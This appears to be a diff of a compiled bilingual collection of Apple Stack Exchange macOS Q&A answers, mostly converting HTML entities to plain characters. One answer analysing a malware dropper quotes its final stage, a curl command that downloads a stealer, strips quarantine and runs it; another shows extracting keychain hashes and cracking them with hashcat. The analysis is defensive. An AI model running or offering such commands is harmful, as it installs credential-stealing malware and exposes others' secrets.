-If you think back to the point in time where NeXT &quot;divorced&quot; the high-level OpenStep from its underpinnings, the low-level parts that are not OpenStep would be the ones that would later become Darwin.
+If you think back to the point in time where NeXT "divorced" the high-level OpenStep from its underpinnings, the low-level parts that are not OpenStep would be the ones that would later become Darwin.
 In the beginning, Apple used to make Darwin available as a separate OS, including compiled binaries, installers, ISOs, etc. that you could install on Apple hardware. However, for many years now, Apple only provides a source code dump, every time a new release of macOS comes out. It isn't even possible to compile this source code, because it depends on Apple's internal build tools and build pipeline. There have been some projects trying to patch Darwin to compile it with publicly available tools, but those projects have all died from lack of interest.
-Since all of the things you mentioned were born on Unix and use Unix APIs and Unix libraries, they actually typically don't even know about the &quot;non-Darwin&quot; parts of macOS, so it is only logical that they will consider the OS to be &quot;Darwin&quot;. Note that &quot;Darwin&quot; is also what gets returned as the name of the OS when you call the Unix/POSIX int uname(struct utsname *buf) library function or the uname Unix/POSIX commandline utility.
-So, to answer the question you didn't ask explicitly but is implicit in your question: why does Node.js return &quot;Darwin&quot; for the name of macOS? Because when Node.js asks macOS for its name, that's what macOS tells it its name is!
+Since all of the things you mentioned were born on Unix and use Unix APIs and Unix libraries, they actually typically don't even know about the "non-Darwin" parts of macOS, so it is only logical that they will consider the OS to be "Darwin". Note that "Darwin" is also what gets returned as the name of the OS when you call the Unix/POSIX int uname(struct utsname *buf) library function or the uname Unix/POSIX commandline utility.
+So, to answer the question you didn't ask explicitly but is implicit in your question: why does Node.js return "Darwin" for the name of macOS? Because when Node.js asks macOS for its name, that's what macOS tells it its name is!
 
 ---
 
@@ -6154,7 +6154,7 @@ In earlier versions of macOS (pre-11.x) there was a built-in list of exclusions 
 Some of the more obvious user file exclusions are Trash, Document revisions and MobileBackups from the local Time Machine store are all excluded. The rest of the exclusions are for system things like caches and databases that exist to index other files where the system can regenerate these databases after a restore.
 
 In addition, apps can use a file's metadata to exclude a file from backups. You can view this list of files by running the command:
-sudo mdfind &quot;com_apple_backup_excludeItem = 'com.apple.backupd'&quot;
+sudo mdfind "com_apple_backup_excludeItem = 'com.apple.backupd'"
 
 On my system this outputs the following:
 /Users/brant/Library/Calendars/Calendar Cache
@@ -6189,7 +6189,7 @@ tmutil removeexclusion _item_ removed either type of exclusion rule as appropria
 
 ---
 
-#### 242. Can a Mac&#39;s model year be determined with a Terminal Command?
+#### 242. Can a Mac's model year be determined with a Terminal Command?
 
 **问题描述 / Problem Description**:
 Tags: macos, terminal | Score: 89 | Views: 117697 | Answers: 11
@@ -6215,7 +6215,7 @@ curl -s https://support-sp.apple.com/sp/product?cc=$(
   system_profiler SPHardwareDataType \
     | awk '/Serial/ {print $4}' \
     | cut -c 9-
-) | sed 's|.*&lt;configCode&gt;\(.*\)&lt;/configCode&gt;.*|\1|'
+) | sed 's|.*<configCode>\(.*\)</configCode>.*|\1|'
 
 There used to be a private library file with these mappings so you could consult it offline, but I noticed it was gone as of 10.8.3 (and perhaps earlier) so the above trick is the only one I know that works on the current OS without third party libraries.
 Some nice third party libararies provide a look up of this:
@@ -6282,7 +6282,7 @@ In [3]: print(convert(r_alt))
 
 ---
 
-#### 245. How can I make &#39;rm&#39; move files to the trash can?
+#### 245. How can I make 'rm' move files to the trash can?
 
 **问题描述 / Problem Description**:
 Tags: command-line, automation, macos | Score: 89 | Views: 72480 | Answers: 8
@@ -6309,7 +6309,7 @@ $ trash -l | grep foo.txt
 Correcting bad habits
 Here’s where the personal advice starts - changing one’s behavior is hard.
 To help yourself re-train your habit so that you use trash instead of rm is alias it to a custom message in your .profile.
-alias rm=&quot;echo Use 'del', or the full path i.e. '/bin/rm'&quot;
+alias rm="echo Use 'del', or the full path i.e. '/bin/rm'"
 
 So, whenever you use rm, you'll be prompted to either use trash or /bin/rm. Remember, this is only temporary, after a while you should remove the alias.
 
@@ -6349,8 +6349,8 @@ When you open it, you can browse through the available AppleScript commands for 
 Tags: macos, fullscreen | Score: 89 | Views: 29702 | Answers: 3
 
 **解决方案 / Solution**:
-macOS Sierra (10.12) introduced &quot;reduce motion&quot;.
-Go to System Preferences &gt; Accessibility &gt; Display and check the box labeled Reduce motion.
+macOS Sierra (10.12) introduced "reduce motion".
+Go to System Preferences > Accessibility > Display and check the box labeled Reduce motion.
 I find this makes things much more pleasant ;)
 
 ---
@@ -6361,7 +6361,7 @@ I find this makes things much more pleasant ;)
 Tags: terminal, xcode | Score: 89 | Views: 38571 | Answers: 6
 
 **解决方案 / Solution**:
-Neither &quot;installing components&quot; via Xcode, nor resetting the developer directory using sudo xcode-select -r worked for me. However,
+Neither "installing components" via Xcode, nor resetting the developer directory using sudo xcode-select -r worked for me. However,
 sudo xcode-select -s /Library/Developer/CommandLineTools
 
 worked. Thanks to Royite on Apple's Developer Forums for this solution.
@@ -6413,7 +6413,7 @@ See V2EX thread for community solutions.
 简单说下它能干嘛：
 
 快：百万级文件，搜索结果 3 毫秒出来
-搜索语法：支持 ext:pdf 、size:&gt;100mb 、modified:today 这种组合查询，不用再一个个翻文件夹了
+搜索语法：支持 ext:pdf 、size:>100mb 、modified:today 这种组合查询，不用再一个个翻文件夹了
 实时更新：实时感知文件变化，改了文件不到半秒就能查了
 全局快捷键：⌥Space 随时呼出，用完就走
 隐私：纯本地运行，不联网，不收集任何数据
@@ -6777,7 +6777,7 @@ Tags: macos, security, hacking | Score: 13 | Views: 1832 | Answers: 1 | Created:
 
 **解决方案 / Solution**:
 It's a highly obfuscated (and obviously malicious) shell command that eventually downloads and executes a binary payload with the name helper, bypassing Gatekeeper. The last stage of the drop is this:
-curl -o /tmp/helper https://rvdownloads.com/usbfix/update &amp;&amp; xattr -c /tmp/helper &amp;&amp; chmod +x /tmp/helper &amp;&amp; /tmp/helper
+curl -o /tmp/helper https://rvdownloads.com/usbfix/update && xattr -c /tmp/helper && chmod +x /tmp/helper && /tmp/helper
 
 Two of the AV engines on the VirusTotal website flag the payload as a credential stealer:
 Avast        MacOS:Stealer-HH
@@ -6803,7 +6803,7 @@ Clean up temporary files
 
 
 You have to assume that all your private data is compromised.
-The one mitigating feature of this malware, at least in the variant analyzed by Anthropic on GitHub, is that it has no persistence mechanism. It's apparently one and done. But I'm not a security researcher and I didn't disassemble the payload or run it to see what it does. At a minimum, you should open System Settings &gt; General &gt; Login Items &amp; Extensions and make sure there is nothing there that you don't recognize, even if it looks innocent. If there is, please report it here.
+The one mitigating feature of this malware, at least in the variant analyzed by Anthropic on GitHub, is that it has no persistence mechanism. It's apparently one and done. But I'm not a security researcher and I didn't disassemble the payload or run it to see what it does. At a minimum, you should open System Settings > General > Login Items & Extensions and make sure there is nothing there that you don't recognize, even if it looks innocent. If there is, please report it here.
 Waste no time changing all important passwords. Take whatever precautions you deem necessary against identity theft. Expect follow-on attacks attempting to defeat two-factor authentication.
 For the form those follow-on attacks may take, see:
 How Attackers Bypass Two-factor Authentication (2FA) (zitadel.com).
@@ -6815,7 +6815,7 @@ Even if the attacker has already obtained your user credentials, they still need
 
 ---
 
-#### 282. Adding &quot;real&quot; creation date to scanned &quot;old&quot;pictures
+#### 282. Adding "real" creation date to scanned "old"pictures
 
 **问题描述 / Problem Description**:
 Tags: macos, exif | Score: 9 | Views: 1096 | Answers: 3 | Created: 2026-03-30
@@ -6823,7 +6823,7 @@ Tags: macos, exif | Score: 9 | Views: 1096 | Answers: 3 | Created: 2026-03-30
 **解决方案 / Solution**:
 Unix timestamps (as used by touch) can go before 1970 (thanks @slingerapp for pointing this out) but this is not relevant here.
 exiftool can be installed directly from the ExifTool Website as a standard macOS package, or via Homebrew/MacPorts. It allows to change the EXIF metadata of the picture, including the creation date. EXIF stores the same information in different tags, ideally all of them are updated to the same value.
-exiftool -DateTimeOriginal=&quot;2023:01:15 12:34:56&quot; -CreateDate=&quot;2023:01:15 12:34:56&quot; -MediaCreateDate=&quot;2023:01:15 12:34:56&quot; /path/to/image.jpg
+exiftool -DateTimeOriginal="2023:01:15 12:34:56" -CreateDate="2023:01:15 12:34:56" -MediaCreateDate="2023:01:15 12:34:56" /path/to/image.jpg
 
 PS: You need to do this before loading an image into Photos or similar. If it is already managed by Photos, export/copy it to a temporary folder, delete it in Photos, run exiftool and import it again.
 
@@ -6850,7 +6850,7 @@ Mac Pro, 2019
 
 ---
 
-#### 284. What is a reliable way to get &quot;last shutdown&quot; time via shell script in macOS Tahoe 26.4?
+#### 284. What is a reliable way to get "last shutdown" time via shell script in macOS Tahoe 26.4?
 
 **问题描述 / Problem Description**:
 Tags: macos, command-line, shutdown, shortcuts-app, tahoe | Score: 6 | Views: 449 | Answers: 2 | Created: 2026-04-03
@@ -6889,8 +6889,8 @@ Of course, this only the most recent orderly shutdown.
 Tags: command-line, homebrew, search | Score: 6 | Views: 1369 | Answers: 1 | Created: 2025-07-23
 
 **解决方案 / Solution**:
-The brew search command uses a &quot;fuzzy search&quot; based on the &quot;DidYouMean&quot; gem. This causes search results to include formulae that are spelled similarly, by inserting, deleting, substituting, and transposing some letters. The exact algorithms and thresholds that DidYouMean uses for spelling suggestions are not documented but it appears to use Jaro-Winkler and Levenshtein distance.
-&quot;peertube&quot; and &quot;freetube&quot; are spelled similarly enough that searching for the former will return the latter. You can try searching for other strings (like &quot;feertube&quot;, &quot;pretube&quot;, &quot;etube&quot;, &quot;feertub&quot;, &quot;frtbe&quot;, &quot;pertbe&quot;) to get a sense for how similar of a search term will still return a particular formula in the results, or will not.
+The brew search command uses a "fuzzy search" based on the "DidYouMean" gem. This causes search results to include formulae that are spelled similarly, by inserting, deleting, substituting, and transposing some letters. The exact algorithms and thresholds that DidYouMean uses for spelling suggestions are not documented but it appears to use Jaro-Winkler and Levenshtein distance.
+"peertube" and "freetube" are spelled similarly enough that searching for the former will return the latter. You can try searching for other strings (like "feertube", "pretube", "etube", "feertub", "frtbe", "pertbe") to get a sense for how similar of a search term will still return a particular formula in the results, or will not.
 
 **参考链接 / References**:
 - https://apple.stackexchange.com/questions/480853/why-does-brew-search-for-peertube-match-with-freetube-how-does-the-search
@@ -6944,7 +6944,7 @@ Don’t overthink this one as it won’t do good things to your $PATH.
 
 ---
 
-#### 289. After `brew install --cask claude-code` running `claude` fails with &quot;claude not Opened: Apple could not verify claude is free of malware...&quot;
+#### 289. After `brew install --cask claude-code` running `claude` fails with "claude not Opened: Apple could not verify claude is free of malware..."
 
 **问题描述 / Problem Description**:
 Tags: macos, command-line, homebrew, gatekeeper | Score: 5 | Views: 3951 | Answers: 1 | Created: 2025-08-20
@@ -6955,9 +6955,9 @@ xattr -d com.apple.quarantine $(which claude)
 
 or via GUI:
 
-Go to &quot;Privacy &amp; Security&quot; in the &quot;Settings&quot; app
-Scroll down to &quot;Security&quot;
-Hit &quot;Allow Anyway&quot; next to &quot;'claude' was blocked to protect your Mac&quot;
+Go to "Privacy & Security" in the "Settings" app
+Scroll down to "Security"
+Hit "Allow Anyway" next to "'claude' was blocked to protect your Mac"
 
 
 In case this problem could be fixed upstream, I've opened a Github issue on homebrew/homebrew-cask:
@@ -6995,9 +6995,9 @@ Then, on the Mac:
 
 sudo vifs (from an admin account)
 
-Add a line for each volume, in the format: UUID=&lt;UUID&gt; none auto ro
+Add a line for each volume, in the format: UUID=<UUID> none auto ro
 
-If you know the volume label, you can replace the first part with LABEL=&lt;label&gt; (and perhaps skip the Linux part!), though you need to replace special characters e.g. space → \040.
+If you know the volume label, you can replace the first part with LABEL=<label> (and perhaps skip the Linux part!), though you need to replace special characters e.g. space → \040.
 
 If you know the volume format, you can replace the auto with hfs or apfs.
 
@@ -7009,7 +7009,7 @@ Save and exit.
 
 
 (That assumes you’re familiar with vi.  If not, there’s loads of info out there.)
-After that, when you connect the HD, its volumes will be automounted in read-only mode.  Trying to save anything will fail with an error such as ‘Read-only file system’ or ‘The volume “&lt;volumename&gt;” is read only.’  QEF∎
+After that, when you connect the HD, its volumes will be automounted in read-only mode.  Trying to save anything will fail with an error such as ‘Read-only file system’ or ‘The volume “<volumename>” is read only.’  QEF∎
 
 I’m still surprised there’s no all-Mac solution to this, though…
 If I hadn’t had a Linux machine handy, my next attempt would probably have been to pause diskarbitrationd by sending it SIGSTOP, then work out how to manually mount each volume read-only, and finally send SIGCONT to resume the diskarbitrationd.  But that’s awkward, as neither Disk Utility nor diskutil will work without diskarbitrationd; and there are reports of significant collateral damage, even after resuming it, though I can’t confirm that.
@@ -7098,7 +7098,7 @@ After entering 9 as the exponent, click the +/- button, or press the key combina
 
 ---
 
-#### 295. &quot;topgrade&quot; or &quot;brew&quot; issue? Warning: Calling conflicts_with formula: is deprecated! There is no replacement
+#### 295. "topgrade" or "brew" issue? Warning: Calling conflicts_with formula: is deprecated! There is no replacement
 
 **问题描述 / Problem Description**:
 Tags: command-line, homebrew | Score: 4 | Views: 1228 | Answers: 1 | Created: 2025-08-21
@@ -7114,7 +7114,7 @@ After some testing on my system, it seems that the options for fixing are:
 Ignore the deprecation warning and wait for all of the offending casks to be updated.
 Reinstall all of the offending casks. This worked for me with brew reinstall wireshark-app. A brute-force approach of just reinstalling all casks should work as well.
 
-Update: running grep -irl '&quot;formula&quot;:' &quot;${HOMEBREW_PREFIX}/Caskroom&quot; should find all the offending casks, although there may be some false alarms (for me, this included mactex-no-gui which has a depends_on formula:.
+Update: running grep -irl '"formula":' "${HOMEBREW_PREFIX}/Caskroom" should find all the offending casks, although there may be some false alarms (for me, this included mactex-no-gui which has a depends_on formula:.
 
 **参考链接 / References**:
 - https://apple.stackexchange.com/questions/481264/topgrade-or-brew-issue-warning-calling-conflicts-with-formula-is-deprecat
@@ -7141,8 +7141,8 @@ Below are the main steps, assuming homebrew and a word list are already availabl
 brew tap miln-eu/miln-eu
 brew install miln-keysafe hashcat
 
-keysafe -recover -path sample.keychain &gt; keychain-hash.txt
-sed 's/^[^:]*://' keychain-hash.txt &gt; for-hashcat.txt
+keysafe -recover -path sample.keychain > keychain-hash.txt
+sed 's/^[^:]*://' keychain-hash.txt > for-hashcat.txt
 
 hashcat -m 23100 --keep-guessing for-hashcat.txt ~/Downloads/clem9669_wordlist_small
 
@@ -7190,12 +7190,12 @@ Tags: macos, mac-appstore, tahoe | Score: 3 | Views: 157 | Answers: 1 | Created:
 
 **解决方案 / Solution**:
 AppStore (and Books.app for that matter) have various glitches and this is one of them.
-For example, I can reproduce the loss of the &quot;Purchase&quot;, or &quot;Install&quot; button by enabling &quot;Hover Text&quot; in System Settings and pressing the cmd key whilst going over items like the &quot;Cancel&quot; button in your screenshot:
+For example, I can reproduce the loss of the "Purchase", or "Install" button by enabling "Hover Text" in System Settings and pressing the cmd key whilst going over items like the "Cancel" button in your screenshot:
 
-It will stay lost even after quitting and re-launching AppStore and I can bring it back by using &quot;Hover Text&quot; on certain items in the main AppStore background window (a reboot also did revive it).
+It will stay lost even after quitting and re-launching AppStore and I can bring it back by using "Hover Text" on certain items in the main AppStore background window (a reboot also did revive it).
 Another, but less permanent way - as commented by Linc Davis - is to drag the window, including the purchase sheet, into Mission Control (the top spaces bar).
 Also dragging the main window makes the button disappear and reappear in rapid succession.
-Which brings us to the answer: According to nohillside's comments, dragging the main AppStore window slightly offscreen and back again, did in fact revive the &quot;Purchase&quot; button.
+Which brings us to the answer: According to nohillside's comments, dragging the main AppStore window slightly offscreen and back again, did in fact revive the "Purchase" button.
 Why this behaviour persisted through reboots is still a mystery to me though.
 
 **参考链接 / References**:
@@ -7231,7 +7231,7 @@ According to the „Supports“ section on the product page, this dock only supp
 
 ---
 
-#### 301. Getting &quot;“Chromium” is damaged and can’t be opened.&quot; after installing with `brew install --cask chromium`
+#### 301. Getting "“Chromium” is damaged and can’t be opened." after installing with `brew install --cask chromium`
 
 **问题描述 / Problem Description**:
 Tags: install, homebrew, gatekeeper, macos | Score: 3 | Views: 2542 | Answers: 1 | Created: 2025-05-03
@@ -7258,8 +7258,8 @@ The PATH environment variable is subject to change between releases of macOS. Fo
 If you require a predictable PATH environment variable, proactively set it based on your needs.
 darwin/sysroot/include/paths.h
 Within the underlying darwin source code are the following constants:
-#define _PATH_DEFPATH &quot;/usr/local/bin:/bin:/usr/bin&quot;
-#define _PATH_STDPATH &quot;/bin:/usr/bin:/sbin:/usr/sbin&quot;
+#define _PATH_DEFPATH "/usr/local/bin:/bin:/usr/bin"
+#define _PATH_STDPATH "/bin:/usr/bin:/sbin:/usr/sbin"
 
 It is likely everything appended to these values is application specific; be that by the developers' choice or through user configuration files.
 
@@ -7268,7 +7268,7 @@ It is likely everything appended to these values is application specific; be tha
 
 ---
 
-#### 303. How to add date and time instead of &quot;-1&quot; to &quot;duplicate&quot; files (files with names which already exists in the same folder)?
+#### 303. How to add date and time instead of "-1" to "duplicate" files (files with names which already exists in the same folder)?
 
 **问题描述 / Problem Description**:
 Tags: macos, finder, filesystem, automation | Score: 2 | Views: 325 | Answers: 1 | Created: 2026-04-21
@@ -7278,8 +7278,8 @@ No, but instead of downloading the files in a web browser, you may be able to ad
 Source - https://stackoverflow.com/a/76231090
 Posted by l'L'l
 Retrieved 2026-04-21, License - CC BY-SA 4.0
-url=&quot;https://example.com/media/document.txt&quot;
-curl -o &quot;$(basename ${url%.*}-$(date +&quot;%Y-%m-%d&quot;).${url##*.})&quot; -s &quot;$url&quot; -C -
+url="https://example.com/media/document.txt"
+curl -o "$(basename ${url%.*}-$(date +"%Y-%m-%d").${url##*.})" -s "$url" -C -
 
 It will only work if the server allows deep linking.
 
@@ -7318,7 +7318,7 @@ Tags: macos, wifi, tethering | Score: 2 | Views: 169 | Answers: 1 | Created: 202
 
 **解决方案 / Solution**:
 In the menu bar item, the icon of the active network is outlined in blue. It won't necessarily be at the top. All known networks are listed by name in alphabetical order.
-Also, as helpfully pointed out by @Marc Wilson in a comment, the WiFi hotspot created by an iPhone switches on and off automatically on demand, if you've enabled Personal Hotspot &gt; Allow Others to Join in the Cellular settings.
+Also, as helpfully pointed out by @Marc Wilson in a comment, the WiFi hotspot created by an iPhone switches on and off automatically on demand, if you've enabled Personal Hotspot > Allow Others to Join in the Cellular settings.
 
 **参考链接 / References**:
 - https://apple.stackexchange.com/questions/486065/why-is-it-that-since-updating-to-macos-26-it-shows-all-wifi-including-personal
@@ -7418,7 +7418,7 @@ And I suspect you are aware of application launchers such as Alfred. While relat
 
 ---
 
-#### 312. Is it possible to play Chess.app in macOS&#39;s Terminal without the graphical interface?
+#### 312. Is it possible to play Chess.app in macOS's Terminal without the graphical interface?
 
 **问题描述 / Problem Description**:
 Tags: terminal | Score: 2 | Views: 397 | Answers: 1 | Created: 2024-10-28
@@ -7434,7 +7434,7 @@ Update: In the same folder as the engine are some data files that appear to be o
 
 ---
 
-#### 313. &quot;Command not found: mosh-server&quot; when trying to connect to macOS server running mosh
+#### 313. "Command not found: mosh-server" when trying to connect to macOS server running mosh
 
 **问题描述 / Problem Description**:
 Tags: macos, command-line, homebrew, ssh, open-source | Score: 2 | Views: 966 | Answers: 2 | Created: 2024-08-19
@@ -7442,12 +7442,12 @@ Tags: macos, command-line, homebrew, ssh, open-source | Score: 2 | Views: 966 | 
 **解决方案 / Solution**:
 For some reason, homebrew wasn't added to the path in non-interactive shells.
 To fix it, run on the server:
-echo 'export PATH=&quot;/opt/homebrew/bin:$PATH&quot;' &gt;&gt; ~/.zshenv 
+echo 'export PATH="/opt/homebrew/bin:$PATH"' >> ~/.zshenv 
 
 or add the following to your ~/.zshenv:
 # Homebrew path support
-if command -v /opt/homebrew/bin/brew &gt;/dev/null 2&gt;&amp;1; then
-  eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;
+if command -v /opt/homebrew/bin/brew >/dev/null 2>&1; then
+  eval "$(/opt/homebrew/bin/brew shellenv)"
 fi
 
 Note: This assumes you have an ARM Mac (M1/M2/M3...). On Intel, you need to replace /opt/homebrew with /usr/local.
@@ -7575,9 +7575,9 @@ Tags: macos, icloud, hard-drive, storage | Score: 1 | Views: 107 | Answers: 1 | 
 iCloud is a syncing solution, putting on an external drive will lead to problems as soon as your Mac without it the first time.
 What you can do instead:
 
-Enable &quot;Optimize Mac Storage&quot; in System Settings -&gt; iCloud -&gt; iDrive. This will allow macOS to offload files in your iDrive to iCloud and only keep a stub on the disk itself. If you access such a file, it will be automatically get downloaded
+Enable "Optimize Mac Storage" in System Settings -> iCloud -> iDrive. This will allow macOS to offload files in your iDrive to iCloud and only keep a stub on the disk itself. If you access such a file, it will be automatically get downloaded
 Move the first 50 GB from your OneDrive to your iCloud Drive folder on the Mac and wait til it is fully synchronized to iCloud (may take a day or two, depending on network speed etc)
-Open the iCloud Drive folder, right-click on folders you seldom need and select &quot;Remove Download&quot;. macOS does manage storage automatically, but this speeds up the process
+Open the iCloud Drive folder, right-click on folders you seldom need and select "Remove Download". macOS does manage storage automatically, but this speeds up the process
 Once enough disk space is available again, move the remaining data from OneDrive to your iCloud Drive folder (and may repeat the forced removal after the sync is done).
 
 **参考链接 / References**:
@@ -7585,7 +7585,7 @@ Once enough disk space is available again, move the remaining data from OneDrive
 
 ---
 
-#### 322. Why am I unable to enroll certain MacBooks in Apple Business Essentials? &quot;Enrollment failed. Please try again.&quot;
+#### 322. Why am I unable to enroll certain MacBooks in Apple Business Essentials? "Enrollment failed. Please try again."
 
 **问题描述 / Problem Description**:
 Tags: macos, macbook-pro, mdm, apple-business | Score: 1 | Views: 229 | Answers: 2 | Created: 2025-12-02
@@ -7647,7 +7647,7 @@ C02220700
 EA02K4 AW
 OEO 3.5G 32G
 
-The 2D barcode was scanned and decoded as J02220700&gt;A02T4A&lt;.
+The 2D barcode was scanned and decoded as J02220700>A02T4A<.
 Wireless Module
 Here's an example of a barcode printed on a Wireless Module witnessed in the following YouTube repair video.
 
@@ -7692,7 +7692,7 @@ Unfortunately, it appears the original question can not be authoritatively answe
 
 ---
 
-#### 327. Apps won&#39;t get removed from dock and show as &quot;running in background&quot; since I updated to macOS 26
+#### 327. Apps won't get removed from dock and show as "running in background" since I updated to macOS 26
 
 **问题描述 / Problem Description**:
 Tags: macos, macbook-pro | Score: 1 | Views: 303 | Answers: 1 | Created: 2025-10-19
@@ -7734,7 +7734,7 @@ Use xcode-select --install to reinstall the CLT, which is what Homebrew wants.
 
 ---
 
-#### 330. How to tune &quot;optimized battery charging&quot; in macOS?
+#### 330. How to tune "optimized battery charging" in macOS?
 
 **问题描述 / Problem Description**:
 Tags: macos, macbook-pro, battery, charging | Score: 1 | Views: 326 | Answers: 1 | Created: 2025-09-15
@@ -7956,7 +7956,6 @@ See V2EX thread for community solutions.
 点击「账户」
 点击「加入新账户」
 在列表中选择「iCloud」
-
 
 **解决方案 / Solution**:
 See V2EX thread for community solutions.
